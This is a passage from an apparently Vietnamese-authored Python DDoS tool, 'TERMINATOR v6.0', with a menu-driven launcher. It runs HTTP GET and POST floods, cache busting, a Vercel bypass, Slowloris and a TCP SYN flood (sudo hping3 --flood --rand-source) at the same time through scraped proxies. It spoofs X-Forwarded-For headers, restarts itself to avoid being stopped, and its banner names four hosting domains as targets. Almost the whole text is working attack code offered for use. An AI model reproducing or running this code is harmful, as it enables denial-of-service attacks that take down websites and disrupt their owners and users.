                    "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
                    "X-Cache-Buster": hashlib.md5(os.urandom(16)).hexdigest(),
                }
                
                response = requests.get(url, headers=headers, proxies=proxy, timeout=10, verify=False, stream=True)
                try:
                    chunk = response.content[:4096]
                except:
                    pass
                
                with self.lock:
                    self.request_count += 1
                    if self.request_count % 1000 == 0:
                        print(f"\r[*] CACHE BUSTER: {self.request_count} URLs | Proxy: {len(self.proxy_manager.live_proxies)}", end="")
            except:
                pass
    
    def start_attack(self, num_threads=CACHE_BYPASS_THREADS):
        self.running = True
        print(f"\n[*] CACHE BUSTER: {num_threads} luồng (phá hủy cache)...")
        threads = []
        for i in range(num_threads):
            t = threading.Thread(target=self.send_cache_buster, args=(i,))
            t.daemon = True
            t.start()
            threads.append(t)
            if i % 500 == 0:
                time.sleep(0.005)
        return threads
    
    def stop_attack(self):
        self.running = False

# ============================================
# LỚP SLOWLORIS
# ============================================
class Slowloris:
    def __init__(self):
        self.sockets = []
        self.running = False
        
    def create_socket(self, target_host=None, target_path=None):
        if target_host is None:
            target_host = random.choice(TARGET_HOSTS)
        if target_path is None:
            target_path = random.choice(TARGET_PATHS)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            ssl_sock = context.wrap_socket(sock, server_hostname=target_host)
            ssl_sock.connect((target_host, TARGET_PORT))
            request = f"GET {target_path} HTTP/1.1\r\n"
            request += f"Host: {target_host}\r\n"
            request += f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
            request += f"Accept: */*\r\n"
            request += f"Accept-Language: en-US,en;q=0.5\r\n"
            request += f"Accept-Encoding: gzip, deflate, br\r\n"
            request += f"Connection: keep-alive\r\n"
            request += f"X-Random: {os.urandom(random.randint(500,2000)).hex()}\r\n"
            ssl_sock.send(request.encode())
            return ssl_sock
        except:
            return None
    
    def maintain_sockets(self, thread_id):
        host = random.choice(TARGET_HOSTS)
        sockets = []
        for i in range(50):
            sock = self.create_socket(target_host=host)
            if sock:
                sockets.append(sock)
        self.sockets.extend(sockets)
        while self.running:
            for i, sock in enumerate(sockets):
                try:
                    random_header = f"X-Random-{random.randint(1, 9999)}: {os.urandom(random.randint(500, 3000)).hex()}\r\n"
                    sock.send(random_header.encode())
                    if random.random() < 0.4:
                        sock.send(b"Keep-Alive: timeout=999, max=999\r\n")
                    time.sleep(random.uniform(3, 10))
                except:
                    try:
                        sock.close()
                    except:
                        pass
                    new_sock = self.create_socket(target_host=host)
                    if new_sock:
                        sockets[i] = new_sock
                    time.sleep(1)
    
    def start_attack(self, num_threads=SLOWLORIS_THREADS):
        self.running = True
        print(f"\n[*] SLOWLORIS: {num_threads} luồng...")
        threads = []
        for i in range(num_threads):
            t = threading.Thread(target=self.maintain_sockets, args=(i,))
            t.daemon = True
            t.start()
            threads.append(t)
            time.sleep(0.005)
        return threads
    
    def stop_attack(self):
        self.running = False
        for sock in self.sockets:
            try:
                sock.close()
            except:
                pass
        self.sockets = []

# ============================================
# LỚP TCP SYN FLOOD (dùng subprocess)
# ============================================
class TCPSynFlood:
    def __init__(self):
        self.processes = []
        self.running = False
    
    def start_syn_flood(self):
        """Bắt đầu TCP SYN Flood bằng hping3 nếu có"""
        self.running = True
        print("\n[*] TCP SYN FLOOD: Đang khởi động...")
        for host in TARGET_HOSTS:
            try:
                # Kiểm tra hping3 có sẵn không
                subprocess.run(["which", "hping3"], capture_output=True, check=True)
                cmd = ["sudo", "hping3", "-S", "-p", "443", "--flood", "--rand-source", host]
                proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                self.processes.append(proc)
                print(f"[+] TCP SYN FLOOD đã bắt đầu cho {host}")
            except:
                print(f"[-] Không thể chạy hping3 cho {host} (cần cài đặt: sudo apt install hping3)")
    
    def stop_flood(self):
        self.running = False
        for proc in self.processes:
            try:
                proc.terminate()
            except:
                pass
        self.processes = []

# ============================================
# HÀM CHÍNH
# ============================================
def print_banner():
    banner = f"""
    ╔══════════════════════════════════════════════════════════════════════╗
    ║  ████████╗███████╗██████╗ ███╗   ███╗██╗███╗   ██╗ █████╗ ████████╗ ║
    ║  ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║██║████╗  ██║██╔══██╗╚══██╔══╝ ║
    ║     ██║   █████╗  ██████╔╝██╔████╔██║██║██╔██╗ ██║███████║   ██║    ║
    ║     ██║   ██╔══╝  ██╔══██╗██║╚██╔╝██║██║██║╚██╗██║██╔══██║   ██║    ║
    ║     ██║   ███████╗██║  ██║██║ ╚═╝ ██║██║██║ ╚████║██║  ██║   ██║    ║
    ║     ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝   ╚═╝    ║
    ║                                                                      ║
    ║  ██╗   ██╗ ██████╗     ████████╗███████╗██████╗ ███╗   ███╗██╗███╗   ║
    ║  ██║   ██║██╔════╝     ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║██║████╗  ║
    ║  ██║   ██║███████╗        ██║   █████╗  ██████╔╝██╔████╔██║██║██╔██╗ ║
    ║  ╚██╗ ██╔╝██╔═══██╗       ██║   ██╔══╝  ██╔══██╗██║╚██╔╝██║██║██║╚██╗║
    ║   ╚████╔╝ ╚██████╔╝       ██║   ███████╗██║  ██║██║ ╚═╝ ██║██║██║ ╚██║
    ║    ╚═══╝   ╚═════╝        ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═╝
    ╠══════════════════════════════════════════════════════════════════════╣
    ║  PHIÊN BẢN: 6.0 TERMINATOR | {len(HTTP_METHODS)} Methods | {len(TARGET_URLS)} Mục tiêu     ║
    ║  TỔNG LUỒNG: {TOTAL_THREADS} | AUTO RESTART: ON | TCP SYN: {"ON" if TCP_SYN_FLOOD else "OFF"}          ║
    ║  MỤC TIÊU: 4 DOMAINS (x10.mx + vercel.app + unaux.com + liveblog365.com) ║
    ╚══════════════════════════════════════════════════════════════════════════╝
    """
    print(banner)

def main_menu():
    global current_proxy_manager
    proxy_manager = ProxyManager()
    current_proxy_manager = proxy_manager
    
    ultra_attack = None
    http_flood = None
    post_flood = None
    slowloris = None
    vercel_bypass = None
    cache_buster = None
    syn_flood = None
    
    while True:
        print("\n" + "="*60)
        print("           MENU CHÍNH - TERMINATOR v6.0")
        print("="*60)
        print("[1] Quét proxy từ các nguồn online (30+ nguồn)")
        print("[2] Kiểm tra proxy live từ file")
        print("[3] Quét + Kiểm tra proxy (tự động)")
        print("[4] Xem danh sách proxy live")
        print("[5] BẮT ĐẦU SIÊU TẤN CÔNG (TẤT CẢ)")
        print("[6] DỪNG TẤT CẢ")
        print("[7] Thoát")
        print("="*60)
        print(f"[*] MỤC TIÊU: {len(TARGET_HOSTS)} DOMAINS | {len(TARGET_URLS)} URLS")
        print(f"[*] TỔNG LUỒNG: {TOTAL_THREADS}")
        print(f"[*] AUTO RESTART: ON (chống Terminated)")
        print(f"[*] TCP SYN FLOOD: {'ON' if TCP_SYN_FLOOD else 'OFF'}")
        print("="*60)
        
        choice = input("\n[?] Chọn (1-7): ").strip()
        
        if choice == "1":
            proxy_manager.scan_all_sources()
        elif choice == "2":
            if os.path.exists(PROXY_FILE):
                with open(PROXY_FILE, "r") as f:
                    proxies = [line.strip() for line in f if line.strip()]
                print(f"[+] Đã tải {len(proxies)} proxy")
                proxy_manager.check_all_proxies(proxies)
            else:
                print(f"[-] File {PROXY_FILE} không tồn tại! Chọn 1 trước")
        elif choice == "3":
            proxies = proxy_manager.scan_all_sources()
            proxy_manager.check_all_proxies(proxies)
        elif choice == "4":
            live_proxies = proxy_manager.reload_live_proxies()
            print(f"\n[+] Tổng proxy live: {len(live_proxies)}")
            if live_proxies:
                print("[+] 10 proxy mẫu:")
                for proxy in live_proxies[:10]:
                    print(f"    - {proxy}")
        elif choice == "5":
            live_proxies = proxy_manager.reload_live_proxies()
            if not live_proxies:
                print("[-] KHÔNG CÓ PROXY LIVE! Chọn 3 trước")
                continue
            print(f"\n[+] SẴN SÀNG SIÊU TẤN CÔNG VỚI {len(live_proxies)} PROXY LIVE")
            print(f"[+] MỤC TIÊU: {', '.join(TARGET_HOSTS)}")
            print(f"[+] TỔNG LUỒNG: {TOTAL_THREADS}")
            confirm = input("\n[?] Bắt đầu? (y/n): ").strip().lower()
            if confirm == "y":
                # Khởi động tất cả
                http_flood = HTTPFlood(proxy_manager)
                http_flood.start_flood(HTTP_FLOOD_THREADS)
                
                post_flood = PostFlood(proxy_manager)
                post_flood.start_flood(POST_FLOOD_THREADS)
                
                ultra_attack = UltraDDoSAttack(proxy_manager)
                ultra_attack.start_mega_attack(RANDOM_METHOD_THREADS)
                
                vercel_bypass = VercelBypass(proxy_manager)
                vercel_bypass.start_attack(VERCEL_BYPASS_THREADS)
                
                cache_buster = CacheBuster(proxy_manager)
                cache_buster.start_attack(CACHE_BYPASS_THREADS)
                
                slowloris = Slowloris()
                slowloris.start_attack(SLOWLORIS_THREADS)
                
                if TCP_SYN_FLOOD:
                    syn_flood = TCPSynFlood()
                    syn_flood.start_syn_flood()
                
                print(f"\n[!] ĐANG SIÊU TẤN CÔNG {len(TARGET_HOSTS)} DOMAINS... Nhấn Enter để dừng")
                input()
                
                if http_flood: http_flood.stop_flood()
                if post_flood: post_flood.stop_flood()
                if ultra_attack: ultra_attack.stop_attack()
                if vercel_bypass: vercel_bypass.stop_attack()
                if cache_buster: cache_buster.stop_attack()
                if slowloris: slowloris.stop_attack()
                if syn_flood: syn_flood.stop_flood()
                print("\n[!] Đã dừng tất cả")
        elif choice == "6":
            if http_flood: http_flood.stop_flood()
            if post_flood: post_flood.stop_flood()
            if ultra_attack: ultra_attack.stop_attack()
            if vercel_bypass: vercel_bypass.stop_attack()
            if cache_buster: cache_buster.stop_attack()
            if slowloris: slowloris.stop_attack()
            if syn_flood: syn_flood.stop_flood()
            print("[!] Đã dừng tất cả")
        elif choice == "7":
            if proxy_manager and proxy_manager.live_proxies:
                with open(PROXY_LIVE_FILE, "w") as f:
                    for p in proxy_manager.live_proxies:
                        f.write(p + "\n")
                print(f"[+] Đã lưu {len(proxy_manager.live_proxies)} proxy")
            print("[!] Thoát...")
            sys.exit(0)
        else:
            print("[-] Lựa chọn không hợp lệ!")

if __name__ == "__main__":
    auto_restart_handler()
    print_banner()
    main_menu()
